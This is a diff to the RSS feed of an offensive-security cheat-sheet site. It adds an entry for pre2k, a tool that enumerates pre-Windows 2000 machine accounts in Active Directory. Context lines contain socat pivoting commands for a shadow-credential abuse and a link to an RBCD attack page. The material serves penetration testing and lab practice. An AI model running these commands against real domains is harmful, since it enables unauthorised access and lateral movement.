@@ -198,6 +198,13 @@
       <description>Abuse #1: Add Shadow Credential 1. Run socat to Redirect Traffic (Inside Pivoting Node) # Upload socat.zip and unzip Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat&#xA;2. Enable Webdav (Inside Windows Target) [Optional] $Source = @&amp;#34; using System; using System.</description>
     </item>
     <item>
+      <title>Pre-Windows 2000 Computer</title>
+      <link>https://tldrbins.github.io/pre-windows_2000_computer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pre-windows_2000_computer/</guid>
+      <description>Enum pre2k Installation python3 -m venv venv source venv/bin/activate git clone https://github.com/garrettfoster13/pre2k.git cd pre2k/ pip3 install . Query # Unauth pre2k unauth -d &amp;#39;&amp;lt;DOMAIN&amp;gt;&amp;#39; -dc-ip &amp;#39;&amp;lt;DC_IP&amp;gt;&amp;#39; -verbose -inputfile &amp;#39;&amp;lt;MACHINES_FILE&amp;gt;&amp;#39; $ cat machines.txt banking$ $ pre2k unauth -d example.com -dc-ip 192.168.1.10 -verbose -inputfile &amp;#39;machines.txt&amp;#39; ___ __ /&amp;#39;___`\ /\ \ _____ _ __ __ /\_\ /\ \\ \ \/&amp;#39;\ /\ &amp;#39;__`\/\`&amp;#39;__\/&amp;#39;__`\ _______\/_/// /__\ \ , &amp;lt; \ \ \L\ \ \ \//\ __//\______\ // /_\ \\ \ \\`\ \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\ \ \ \/ \/_/ \/____/ \/_____/ \/_/\/_/ \ \_\ v3.</description>
+    </item>
+    <item>
       <title>RBCD Attack</title>
       <link>https://tldrbins.github.io/rbcd/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
